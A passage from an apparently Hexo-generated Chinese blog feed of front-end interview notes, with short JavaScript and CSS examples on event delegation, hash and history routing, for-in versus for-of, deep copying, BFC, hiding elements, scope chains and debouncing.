class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">　　　　<span class="keyword">var</span> e = e || <span class="built_in">window</span>.event;</span></span><br><span class="line"><span class="javascript">　　　　<span class="keyword">var</span> target = e.target || e.srcElement;  <span class="comment">//IE浏览器用event.srcElement</span></span></span><br><span class="line"><span class="javascript">　　　　<span class="keyword">if</span>(target.nodeName.toLowerCase() == <span class="string">'li'</span>)&#123;</span></span><br><span class="line"><span class="undefined">　 　　　　　　alert(123);</span></span><br><span class="line"><span class="undefined">　　　　&#125;</span></span><br><span class="line"><span class="undefined">　　&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="前端路由的实现方法"><a href="#前端路由的实现方法" class="headerlink" title="前端路由的实现方法"></a>前端路由的实现方法</h2><h3 id="什么是前端路由？"><a href="#什么是前端路由？" class="headerlink" title="什么是前端路由？"></a><strong>什么是前端路由？</strong></h3><p>路由的概念来源于服务端，在服务端中路由描述的是 URL 与处理函数之间的映射关系。</p><p>在 Web 前端单页应用 SPA(Single Page Application)中，路由描述的是 URL 与 UI 之间的映射关系，这种映射是单向的，即 URL 变化引起 UI 更新（无需刷新页面）。</p><h3 id="如何实现前端路由？"><a href="#如何实现前端路由？" class="headerlink" title="如何实现前端路由？"></a><strong>如何实现前端路由？</strong></h3><p>要实现前端路由，需要解决两个核心问题：</p><ol><li>如何改变 URL 却不引起页面刷新？</li><li>如何检测 URL 变化了？</li></ol><p>下面分别使用 hash 和 history 两种实现方式回答上面的两个核心问题。</p><h3 id="hash-实现-点击链接则改变hash，监听hash是否改变，改变就重新渲染UI"><a href="#hash-实现-点击链接则改变hash，监听hash是否改变，改变就重新渲染UI" class="headerlink" title="hash 实现:点击链接则改变hash，监听hash是否改变，改变就重新渲染UI"></a><strong>hash 实现:</strong>点击链接则改变hash，监听hash是否改变，改变就重新渲染UI</h3><ol><li>hash 是 URL 中 hash (<code>#</code>) 及后面的那部分，常用作锚点在页面内进行导航，改变 URL 中的 hash 部分不会引起页面刷新</li><li>通过 <a href="https://link.zhihu.com/?target=https%3A//developer.mozilla.org/en-US/docs/Web/API/Window/hashchange_event" target="_blank" rel="noopener">hashchange</a> 事件监听 URL 的变化，改变 URL 的方式只有这几种：通过浏览器前进后退改变 URL、通过<code>标签改变 URL、通过wind</code>ow.location改变URL，这几种情况改变 URL 都会触发 hashchange 事件</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义路由 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/home"</span>&gt;</span>home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/about"</span>&gt;</span>about<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">&lt;!-- 渲染路由对应的 UI --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"routeView"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="comment">// 页面加载完不会触发 hashchange，这里主动触发一次 hashchange 事件</span></span></span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, onLoad)</span></span><br><span class="line"><span class="javascript">          <span class="comment">// 监听路由变化</span></span></span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.addEventListener(<span class="string">'hashchange'</span>, onHashChange)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="comment">// 路由视图</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> routerView = <span class="literal">null</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">onLoad</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              routerView = <span class="built_in">document</span>.querySelector(<span class="string">'#routeView'</span>)</span></span><br><span class="line"><span class="undefined">              onHashChange()</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="comment">// 路由变化时，根据路由渲染对应 UI</span></span></span><br><span class="line"><span class="javascript">          <span class="function"><span class="keyword">function</span> <span class="title">onHashChange</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">switch</span> (location.hash) &#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">case</span> <span class="string">'#/home'</span>:</span></span><br><span class="line"><span class="javascript">                  routerView.innerHTML = <span class="string">'Home'</span></span></span><br><span class="line"><span class="javascript">                  <span class="keyword">return</span></span></span><br><span class="line"><span class="javascript">                  <span class="keyword">case</span> <span class="string">'#/about'</span>:</span></span><br><span class="line"><span class="javascript">                  routerView.innerHTML = <span class="string">'About'</span></span></span><br><span class="line"><span class="javascript">                  <span class="keyword">return</span></span></span><br><span class="line"><span class="javascript">                  <span class="keyword">default</span>:</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">return</span></span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="history-实现-点击链接后-采用pushState改变url，根据url的变化渲染ui"><a href="#history-实现-点击链接后-采用pushState改变url，根据url的变化渲染ui" class="headerlink" title="history 实现:点击链接后,采用pushState改变url，根据url的变化渲染ui"></a>history 实现:点击链接后,采用pushState改变url，根据url的变化渲染ui</h3><ol><li>history 提供了 pushState 和 replaceState 两个方法，这两个方法改变 URL 的 path 部分不会引起页面刷新.但是会分别添加和修改历史记录。</li><li><p>history 提供类似 hashchange 事件的 <a href="https://link.zhihu.com/?target=https%3A//developer.mozilla.org/en-US/docs/Web/API/Window/popstate_event" target="_blank" rel="noopener">popstate</a> 事件，但 popstate 事件有些不同：通过浏览器前进后退改变 URL 时会触发 popstate 事件，通过<code>pushState/replaceState</code>或标签改变 URL 不会触发 popstate 事件。好在我们可以拦截 pushState，eplaceState的调用和标签的点击事件来检测 URL 变化，所以监听 URL 变化可以实现，只是没有 hashchange 那么方便。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- 定义路由 --&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/home"</span>&gt;</span>home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/about"</span>&gt;</span>about<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">          <span class="comment">&lt;!-- 渲染路由对应的 UI --&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"routeView"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 页面加载完不会触发 hashchange，这里主动触发一次 hashchange 事件</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, onLoad)</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 监听路由变化</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.addEventListener(<span class="string">'popstate'</span>, onPopState)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 路由视图</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> routerView = <span class="literal">null</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">onLoad</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            routerView = <span class="built_in">document</span>.querySelector(<span class="string">'#routeView'</span>)</span></span><br><span class="line"><span class="undefined">            onPopState()</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 拦截 &lt;a&gt; 标签点击事件默认行为， 点击时使用 pushState 修改 URL并更新手动 UI，从而实现点击链接更新 URL 和 UI 的效果。</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> linkList = <span class="built_in">document</span>.querySelectorAll(<span class="string">'a[href]'</span>)</span></span><br><span class="line"><span class="javascript">            linkList.forEach(<span class="function"><span class="params">el</span> =&gt;</span> el.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">                e.preventDefault()</span></span><br><span class="line"><span class="javascript">                history.pushState(<span class="literal">null</span>, <span class="string">''</span>, el.getAttribute(<span class="string">'href'</span>))</span></span><br><span class="line"><span class="undefined">                onPopState()</span></span><br><span class="line"><span class="undefined">            &#125;))</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 路由变化时，根据路由渲染对应 UI</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">onPopState</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">switch</span> (location.pathname) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">case</span> <span class="string">'/home'</span>:</span></span><br><span class="line"><span class="javascript">                routerView.innerHTML = <span class="string">'Home'</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">case</span> <span class="string">'/about'</span>:</span></span><br><span class="line"><span class="javascript">                routerView.innerHTML = <span class="string">'About'</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">default</span>:</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span></span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="for-in和for-of的区别"><a href="#for-in和for-of的区别" class="headerlink" title="for in和for of的区别"></a>for in和for of的区别</h2><p> 最直接的区别是：</p><ul><li>for in遍历的是数组的索引（即键名），</li><li>for of遍历的是数组元素值。</li></ul><p>除此之外，对于for in的缺点</p><ol><li>索引是字符串型的数字，因而不能直接进行几何运算</li><li>遍历顺序可能不是实际的内部顺序</li><li>for in会遍历数组所有的可枚举属性，包括原型。例如的原型方法method和name属性</li></ol><p>对于for of的缺点：</p><ol><li>for of不支持普通对象</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.method=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> myArray=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>];</span><br><span class="line">myArray.name=<span class="string">"数组"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> index <span class="keyword">in</span> myArray)</span><br><span class="line">    <span class="built_in">console</span>.log(myArray[index]);    <span class="comment">//0,1,2,method,name</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> value <span class="keyword">of</span> myArray) </span><br><span class="line">    <span class="built_in">console</span>.log(value);    <span class="comment">//1,2,4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    a:<span class="number">1</span>,</span><br><span class="line">    b:<span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> obj)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(obj[i])   <span class="comment">//1,2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j <span class="keyword">of</span> obj)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(j)        <span class="comment">//报错obj[Symbol.iterator] is not a function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.9</title>
      <link href="2020/03/09/%E6%97%A5%E5%B8%B8-2020.3.9/"/>
      <url>2020/03/09/%E6%97%A5%E5%B8%B8-2020.3.9/</url>
      
        <content type="html"><![CDATA[<ul><li>深拷贝与浅拷贝</li><li>什么是BFC，BFC的布局规则是什么，如何创建BFC</li><li>隐藏页面中某个元素的方法</li><li>说一下你对JS执行上下文和作用域链的理解</li><li>防抖函数的作用是什么，请实现一个防抖函数</li><li>节流函数的作用是什么？有哪些应用场景，请实现一个</li><li>什么是闭包，闭包的作用是什么</li><li>实现一个flattenDeep函数，把嵌套的数组扁平化</li><li>关于reduce函数</li><li>数组去重的方法</li></ul><a id="more"></a><h2 id="1-深拷贝与浅拷贝"><a href="#1-深拷贝与浅拷贝" class="headerlink" title="1. 深拷贝与浅拷贝"></a>1. 深拷贝与浅拷贝</h2><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">b.push(<span class="number">4</span>); <span class="comment">// b中添加了一个4</span></span><br><span class="line">alert(a); <span class="comment">// a变成了[1,2,3,4] </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = obj;</span><br><span class="line">obj2.a = <span class="number">20</span>; <span class="comment">// obj2.a改变了，</span></span><br><span class="line">alert(obj.a); <span class="comment">// 20，obj的a跟着改变</span></span><br></pre></td></tr></table></figure><p>深拷贝和浅拷贝是针对复杂数据类型来说的，浅拷贝只拷贝一层，而深拷贝是层层拷贝。</p><h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><blockquote><p>深拷贝复制变量值，对于非基本类型的变量，则递归至基本类型变量后，再复制。深拷贝后的对象与原来的对象是完全隔离的，互不影响，对一个对象的修改并不会影响另一个对象。</p></blockquote><h4 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h4><blockquote><p>浅拷贝是会将对象的每个属性进行依次复制，但是当对象的属性值是引用类型时，实质复制的是其引用，当引用指向的值改变时也会跟着变化。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//Object.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    name:<span class="string">'a'</span>,</span><br><span class="line">    hobbies:&#123;</span><br><span class="line">        like:<span class="string">'coding'</span>,</span><br><span class="line">        hate:<span class="string">'reading'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">let</span> obj2 = <span class="built_in">Object</span>.assign(&#123;&#125;,obj)</span><br><span class="line"><span class="keyword">let</span> obj3 = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(obj))</span><br><span class="line">obj.hobbies.like = <span class="string">'reading'</span></span><br><span class="line">obj.name=<span class="string">'b'</span></span><br><span class="line"><span class="built_in">console</span>.log(obj)</span><br><span class="line"><span class="built_in">console</span>.log(obj2) <span class="comment">//name:a,like:reading,说明没有实现深拷贝</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//JSON.parse(JSON.stringify(obj))我们一般用来深拷贝，其过程说白了 就是利用JSON.stringify 将js对象序列化（JSON字符串），再使用JSON.parse来反序列化(还原)js对象</span></span><br><span class="line"><span class="built_in">console</span>.log(obj3) <span class="comment">//实现了深拷贝，但是存在问题</span></span><br></pre></td></tr></table></figure><blockquote><p>JSON.parse(JSON.stringify(obj)) 的问题：</p><ol><li>对象的属性值是函数时，无法拷贝。</li><li>原型链上的属性无法拷贝</li><li>不能正确的处理 Date 类型的数据</li><li>不能处理 RegExp</li><li>会忽略 symbol</li><li>会忽略 undefined</li></ol></blockquote><h2 id="2-什么是BFC，BFC的布局规则是什么，如何创建BFC"><a href="#2-什么是BFC，BFC的布局规则是什么，如何创建BFC" class="headerlink" title="2.什么是BFC，BFC的布局规则是什么，如何创建BFC"></a>2.什么是BFC，BFC的布局规则是什么，如何创建BFC</h2><ul><li>BFC的定义:</li></ul><blockquote><p> BFC（Block formatting context ）“块级格式上下文”。 是用于布局块级盒子的一块渲染区域。并且与这个区域的外部毫无关系。</p></blockquote><ul><li>BFC的布局规则</li></ul><blockquote><p>内部的Box会在垂直方向，一个接一个地放置。</p><p>Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠。</p><p>每个盒子（块盒与行盒）的margin box的左边，与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</p><p>BFC的区域不会与float box重叠。</p><p>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</p><p>计算BFC的高度时，浮动元素也参与计算。</p></blockquote><ul><li>触发BFC的条件:</li></ul><p>满足下列条件之一就可以触发BFC</p><blockquote><p>1：根元素，即html元素</p><p>2：float的值不为none</p><p>3：overflow的值不为visible</p><p>4：display的值为inline-block、table-cell、table-caption</p><p>5：position的值为absolute或者fixed</p></blockquote><ul><li>BFC的作用</li></ul><p>BFC是页面独立的一个容器，与外界的毫无关系。与不同容器的区别是：</p><p>（1）<strong>可以阻止元素被浮动的元素覆盖</strong>（可做两栏布局自适应）</p><p><img src="https://img-blog.csdnimg.cn/20190428161126130.png" alt="1"></p><p>​       触发红色盒子的BFC后</p><p><img src="https://img-blog.csdnimg.cn/20190428161306268.png" alt="2"></p><p>（2）<strong>解决高度塌陷</strong>：我们知道当浮动的盒子的父元素没有高度时，会出现高度塌陷现象。</p><p>​                                   <img src="https://img-blog.csdnimg.cn/20190428162141491.png" alt="3"></p><p>​           父盒子触发BFC可以解决这个问题,根据布局规则的最后一条。</p><p>（3）<strong>解决同一个BFC区域的垂直方向margin塌陷的问题</strong> </p><p><img src="https://img-blog.csdnimg.cn/20190428165048481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjU3MTI5,size_16,color_FFFFFF,t_70" alt="4"></p><p>​           分为两个不同的BFC之后可以解决 </p><h2 id="3-隐藏页面中某个元素的方法"><a href="#3-隐藏页面中某个元素的方法" class="headerlink" title="3.隐藏页面中某个元素的方法"></a>3.隐藏页面中某个元素的方法</h2><p>隐藏类型：</p><ul><li>完全隐藏：元素从渲染树中消失，不占据空间</li><li>视觉上隐藏：屏幕中不可见，占据空间</li><li>语义上隐藏：读屏软件不可读，但正常占据空间</li></ul><p>完全隐藏：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. display: none;</span><br><span class="line">2. &lt;div hidden&gt;&lt;/div&gt;  hidden属性</span><br></pre></td></tr></table></figure><p>视觉上隐藏：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.利用poisition和盒模型将元素移出可视区范围</span><br><span class="line">position:absolute;</span><br><span class="line">left:-9999px;</span><br><span class="line"></span><br><span class="line">2.利用transform</span><br><span class="line">（1）缩放：transform: scale(0);</span><br><span class="line">（2）移动：transform：translateX(-9999px)</span><br><span class="line"> (3) 旋转：transform: rotateY(90deg);</span><br><span class="line"> </span><br><span class="line">3.透明度</span><br><span class="line">opacity: 0;</span><br><span class="line"></span><br><span class="line">4.visibility: hidden;</span><br><span class="line"></span><br><span class="line">5.层级覆盖， z-index 属性</span><br><span class="line">z-index: -999;</span><br><span class="line"></span><br><span class="line">6.clip-path 裁剪</span><br><span class="line">clip-path: polygon(00,00,00,00);</span><br></pre></td></tr></table></figure><p>语义上隐藏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="4-说一下你对JS执行上下文栈和作用域链的理解"><a href="#4-说一下你对JS执行上下文栈和作用域链的理解" class="headerlink" title="4. 说一下你对JS执行上下文栈和作用域链的理解"></a>4. 说一下你对JS执行上下文栈和作用域链的理解</h2><p>js执行上下文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">执行上下文就是当前 JavaScript 代码被解析和执行时所在环境的抽象概念， JavaScript 中运行任何的代码都是在执行上下文中运行。</span><br><span class="line"></span><br><span class="line">执行上下文类型分为：</span><br><span class="line">1.全局执行上下文</span><br><span class="line">2.函数执行上下文</span><br></pre></td></tr></table></figure><p>作用域</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">作用域:控制着变量与函数的可见性和生命周期。</span><br><span class="line"></span><br><span class="line">作用域有两种工作模型：词法作用域和动态作用域，JS采用的是词法作用域工作模型，词法作用域意味着作用域是由书写代码时变量和函数声明的位置决定的。</span><br><span class="line"></span><br><span class="line">分为：</span><br><span class="line">1.全局作用域</span><br><span class="line">2.局部作用域</span><br><span class="line"></span><br><span class="line">局部作用域又分为：</span><br><span class="line">1.函数作用域</span><br><span class="line">2.块级作用域</span><br></pre></td></tr></table></figure><p>js执行上下文栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">首次运行JavaScript代码的时候,会创建一个全局执行的上下文并Push到当前的执行栈中，每当发生函数调用，引擎都会为该函数创建一个新的函数执行上下文并Push当前执行栈的栈顶。</span><br><span class="line"></span><br><span class="line">当栈顶的函数运行完成后，其对应的函数执行上下文将会从执行栈中Pop出，上下文的控制权将移动到当前执行栈的下一个执行上下文。</span><br><span class="line"></span><br><span class="line">function fun3()&#123;</span><br><span class="line">    console.log(&apos;fun3&apos;)</span><br><span class="line">&#125;</span><br><span class="line">function fun2()&#123;</span><br><span class="line">    fun3()</span><br><span class="line">&#125;</span><br><span class="line">function fun1()&#123;</span><br><span class="line">    fun2()</span><br><span class="line">&#125;</span><br><span class="line">fun1()</span><br><span class="line">入栈：全局，f1,f2,f3</span><br><span class="line">出栈：f3,f2,f1</span><br></pre></td></tr></table></figure><p>作用域链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">作用域链就是从当前作用域开始一层一层向上寻找某个变量，直到找到全局作用域还是没找到，就宣布放弃。这种一层一层的关系，就是作用域链。 </span><br><span class="line"></span><br><span class="line">var a=10;</span><br><span class="line">function fn1()&#123;</span><br><span class="line">    var b=20;</span><br><span class="line">    console.log(fn2)</span><br><span class="line">    function fn2()&#123;</span><br><span class="line">        a=20</span><br><span class="line">    &#125;</span><br><span class="line">    return fn2</span><br><span class="line">&#125;</span><br><span class="line">fn1()()</span><br><span class="line"></span><br><span class="line">fn2中没有a,向上寻找，fn1中也没有，向上找，在全局作用域中找到了</span><br></pre></td></tr></table></figure><h2 id="5-防抖函数的作用是什么，请实现一个防抖函数"><a href="#5-防抖函数的作用是什么，请实现一个防抖函数" class="headerlink" title="5.防抖函数的作用是什么，请实现一个防抖函数"></a>5.防抖函数的作用是什么，请实现一个防抖函数</h2><p>函数防抖（debounce），就是指触发事件后，在 n 秒内函数只能执行一次，如果触发事件后在 n 秒内又触发了事件，则会重新计算函数延执行时间。 比如搜索框搜索输入。只需用户最后一次输入完，再发送请求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 